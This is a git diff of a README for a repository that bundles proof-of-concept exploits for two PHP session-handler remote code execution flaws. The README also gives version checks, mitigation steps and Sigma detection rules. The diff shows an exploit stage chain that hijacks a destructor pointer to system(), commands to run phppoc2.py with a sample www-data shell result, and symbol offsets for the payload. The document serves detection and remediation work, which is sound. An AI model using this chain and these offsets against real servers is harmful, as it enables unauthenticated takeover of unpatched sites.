@@ -2,7 +2,7 @@
 
 **Remote Code Execution via PHP Session Handler Stale Pointer**
 
-Two critical vulnerabilities in PHP's session upload progress handler allow unauthenticated remote code execution against stock Apache + mod_php deployments. No application-level vulnerability (LFI, file upload, deserialization) is required -- just a reachable `index.php`.
+Two critical vulnerabilities in PHP's session upload progress handler allow unauthenticated remote code execution. The CVEs affect all PHP SAPI modes (mod_php, PHP-FPM, etc.); this repo's exploit tools target stock Apache + mod_php (prefork) deployments specifically. No application-level vulnerability (LFI, file upload, deserialization) is required -- just a reachable `index.php`.
 
 The point of this repo is to help detect what servers are vulnerable and to provide evidence of working code.
 I take no credit for creation of the PoCs. Just thought they would be good to have in one place, along with detection and remediation guidance.
@@ -13,13 +13,13 @@ I take no credit for creation of the PoCs. Just thought they would be good to ha
 | **CVE-2026-109619** | `current_file_bytes_processed` stale pointer -- worker-wide `PS()` fields point to freed per-request memory; a subsequent request follows the stale pointer before re-initialization |
 | **CVSS v4** | **9.2 Critical** (both) |
 | **Disclosed** | 2026-10-21 |
-| **Affected** | PHP 8.2 < 8.2.35, 8.3 < 8.3.36, 8.4 < 8.4.27, 8.5 < 8.5.12 |
+| **Affected** | PHP 5.4 through 8.5.11 (patches available for 8.2-8.5 only; all EOL versions are vulnerable) |
 | **Fixed in** | PHP 8.2.35, 8.3.36, 8.4.27, 8.5.12 |
 | **Vector** | Network / No authentication / No user interaction |
 
 ## Am I affected?
 
-If you run **any** of these PHP versions behind Apache with `mod_php` (the prefork MPM), you are vulnerable. No special application code is needed -- the default `index.php` is enough.
+If you run **any** of these PHP versions, you are vulnerable regardless of SAPI (mod_php, PHP-FPM, etc.). No special application code is needed -- the default `index.php` is enough. The exploit tools in this repo target Apache mod_php (prefork MPM) specifically, but the underlying CVEs are in PHP's core session handler.
 
 | Branch | Vulnerable | Fixed |
 |---|---|---|
@@ -41,7 +41,7 @@ php -v | head -1
 apachectl -V | grep MPM
 ```
 
-If `X-Powered-By` shows a version in the vulnerable range and the MPM is `prefork`, patch immediately.
+If `X-Powered-By` shows a version in the vulnerable range, patch immediately. If the MPM is also `prefork`, the exploit in this repo applies directly.
 
 ## What to do right now
 
@@ -51,7 +51,7 @@ If `X-Powered-By` shows a version in the vulnerable range and the MPM is `prefor
    - Deploy WAF rules blocking `PHP_SESSION_UPLOAD_PROGRESS` in request bodies
    - Rate-limit concurrent POST connections per source IP
    - Monitor Apache error logs for OOM and segfault patterns (see [Detection](#how-to-detect-exploitation) below)
-3. **Long-term:** consider migrating from mod_php + prefork to PHP-FPM + event MPM (different process model, not vulnerable to this specific worker-pinning technique)
+3. **Long-term:** consider migrating from mod_php + prefork to PHP-FPM + event MPM (different process model, not vulnerable to this specific worker-pinning technique -- note: the underlying CVEs still affect PHP-FPM; patching is the only complete fix)
 
 ## How to detect exploitation
 
@@ -86,7 +86,7 @@ If you see both of these in close succession, especially multiple times, investi
 
 Two separate rules — one for access logs (the exploit's HTTP footprint) and one for error logs (OOM/segfault indicators). Adapt field names to your SIEM's log ingestion.
 
-**Access log detection** (chunked POST with session upload progress, repeated from one source):
+**Access log detection** (chunked POST with session upload progress, repeated from one source). Note: `cs-body` requires a log source that captures POST body content; standard Apache access logs do not include POST bodies, so this rule needs a WAF, reverse proxy, or SIEM that logs request bodies:
 
 ```yaml
 title: php2shell Session Upload Progress Exploit Traffic
@@ -106,7 +106,7 @@ detection:
     selection_method:
         cs-method: 'POST'
     selection_session:
-        cs-uri-query|contains: 'PHP_SESSION_UPLOAD_PROGRESS'
+        cs-body|contains: 'PHP_SESSION_UPLOAD_PROGRESS'
     selection_chunked:
         cs-header|contains: 'Transfer-Encoding: chunked'
     selection_error:
@@ -145,7 +145,7 @@ detection:
             - 'bytes exhausted'
     selection_segfault:
         message|contains: 'exit signal Segmentation fault'
-    condition: selection_oom or selection_segfault | count() > 3
+    condition: (selection_oom or selection_segfault) | count() > 3
     timeframe: 5m
 falsepositives:
     - Legitimate OOM from very large uploads (would not produce repeated segfaults)
@@ -214,8 +214,8 @@ Stage B1 Heap leak (OOB read)
          -> Extract zval_ptr_dtor address (from HashTable pDestructor)
          -> Calculate libphp.so base address via known symbol offset
 
-Stage A2 Cheap OOM to free PS(hash_serialize_verifier)
-         Second OOM leaves hash_serialize_verifier as dangling pointer
+Stage A2 Cheap OOM to free PS(http_session_vars)
+         Second OOM leaves http_session_vars as dangling pointer
 
 Stage B2 Hijack pDestructor -> system()
          Overwrite freed region with fake zval whose pDestructor = zif_system
@@ -273,6 +273,9 @@ python3 phppoc2.py --host <whatever it is> --port <whatever you have, 80 for exa
 | `--workers` | 150 | Worker count (match `MaxRequestWorkers`) |
 | `--retries` | 3 | Retry attempts for each stage |
 | `--restart` | - | Container name to restart between attempts |
+| `--docker` | `sudo docker` | Docker command to use |
+| `--outdir` | `<repo>/out/` | Directory for output files (absolute path based on script location) |
+| `--timeout` | 600.0 | Overall timeout in seconds |
 
 ### phpexploit.py -- Session poisoning + LFI (companion tool)
 
@@ -352,7 +355,7 @@ python3 phppoc2.py --port 18110
 cat out/p1
 # -> uid=33(www-data) gid=33(www-data) groups=33(www-data)
 # cleanup
-./pure/run_pure.sh && true; docker rm -f p2s-pure-18110
+docker rm -f p2s-pure-18110
 ```
 
 Equivalent manual setup, if you prefer:
@@ -460,12 +463,6 @@ The offsets you need are in the **second column** (the hex values):
 - `zval_ptr_dtor` → `0x65EB60`
 - `zif_system` → `0x465370`
 
-Clean up when done:
-
-```bash
-docker rm -f offset-extract
-```
-
 ### Step 4: Determine the architecture
 
 Check whether the target is x86_64 or aarch64:
@@ -476,6 +473,12 @@ docker exec offset-extract uname -m
 ```
 
 This determines which profile block to edit in the next step.
+
+Clean up the temporary container:
+
+```bash
+docker rm -f offset-extract
+```
 
 ### Step 5: Patch the offsets into phppoc2.py
 
@@ -576,13 +579,13 @@ Run `./selftest.sh` after cloning — it compiles every Python file, verifies th
 
 ## Repository layout & provenance
 
-Everything in `pure/` plus `phppoc2.py` is vendored from [9bie/php2shell-bypass-aslr-exp](https://github.com/9bie/php2shell-bypass-aslr-exp) (the working upstream PoC for Ahmed Sultan's research). Verification: the exploit chain (`phppoc2.py`) and all nine helpers it invokes were byte-identical to upstream at vendoring time; upstream's `pure/evidence/` contains dated run logs proving first-try RCE (`uid=33(www-data)`) against the stock image on both x86_64 and aarch64.
+Everything in `pure/` plus `phppoc2.py` is vendored from [9bie/php2shell-bypass-aslr-exp](https://github.com/9bie/php2shell-bypass-aslr-exp) (the working upstream PoC). Verification: the exploit chain (`phppoc2.py`) and all six helpers it invokes were byte-identical to upstream at vendoring time; upstream's `pure/evidence/` contains dated run logs proving first-try RCE (`uid=33(www-data)`) against the stock image on both x86_64 and aarch64.
 
 | File(s) | Origin |
 |---|---|
-| `phppoc2.py`, `pure/*.py`, `pure/run_pure.sh`, `pure/docker/` | Vendored from 9bie's repo (upstream's entry point `exploit.py` is vendored here as `phppoc2.py` with some changess to make it work better) |
+| `phppoc2.py`, `pure/*.py`, `pure/run_pure.sh`, `pure/docker/` | Vendored from 9bie's repo (upstream's entry point `exploit.py` is vendored here as `phppoc2.py` with some changes to make it work better) |
 | `pure/RESEARCH_PURE_128M.md`, `pure/*.gdb`, `pure/mk_b_min.py`, `pure/mk_flood.py`, `pure/watch_md.sh`, `pure/repro_pure.sh` | Vendored from 9bie's repo — the heap-recalibration kit for other PHP minor versions |
-| `phpexploit.py` | Credit to Ahmed Sultan, there are some minor changes (session poisoning + LFI companion; see its section above) |
+| `phpexploit.py` | Session poisoning + LFI companion with some minor changes (see its section above) |
 | `diag_remote.py` | Original to this repo — target-agnostic remote diagnostic (no shell/log access needed) |
 | `pure/extract_offsets.sh`, `selftest.sh`, `.gitignore` | Original to this repo — lab tooling |
 | `README.md`, `LICENSE` | Original packaging; GPL-3.0 applies to this repo's original files (the upstream vendored code carries no explicit license — the upstream repo is the authoritative source) |
@@ -598,15 +601,16 @@ Local divergence from upstream (kept minimal and deliberate):
 
 ## Credits
 
-- **Original research**: [Ahmed Sultan](https://github.com/Syrex1013) ([@0x4148](https://x.com/0x4148)) -- vulnerability discovery and initial exploit
+- **Vulnerability discovery**: [Ryan Austin / lcfr-hax](https://calif.io/php2shell/) (Calif), [Wiz Research](https://www.wiz.io/) (Sagi Tzadik, Shir Tamari, Nir Ohfeld, Tomer Schwartz), and [OpenAI](https://openai.com/) (Amy Brown et al.) -- independently reported to PHP in August 2026
 - **Working upstream PoC**: [9bie](https://github.com/9bie/php2shell-bypass-aslr-exp) -- full ASLR bypass chain, chunked TE bypass, production-config exploit
-- **Detection rules**: [ikow](https://github.com/ikow/php2shell-poc) -- Sigma, Suricata, and ModSecurity detection rules
-- **This repo**: [struttonpigeon](https://github.com/struttonpigeon) -- PoC packaging, session poisoning variant, lab documentation
+- **This repo**: [struttonpigeon](https://github.com/struttonpigeon) -- PoC packaging, session poisoning variant, remote diagnostic, detection rules, lab documentation
 
 ## References
 - [php.net security advisory](https://www.php.net/ChangeLog-8.php)
-- [Rapid7 AttackerKB analysis](https://attackerkb.com/)
-- [Datadog threat research](https://securitylabs.datadoghq.com/)
+- [Rapid7 AttackerKB analysis](https://attackerkb.com/) (search for CVE-2026-109618)
+- [Datadog threat research](https://securitylabs.datadoghq.com/articles/php2shell-critical-vulnerabilities-in-php/)
+- [Calif php2shell research](https://calif.io/php2shell/)
+- [CERT-EU Security Advisory 2026-018](https://cert.europa.eu/publications/security-advisories/2026-018)
 - [9bie exploit writeup (English)](https://github.com/9bie/php2shell-bypass-aslr-exp/blob/main/readme_en.md)
 
 ## Disclaimer
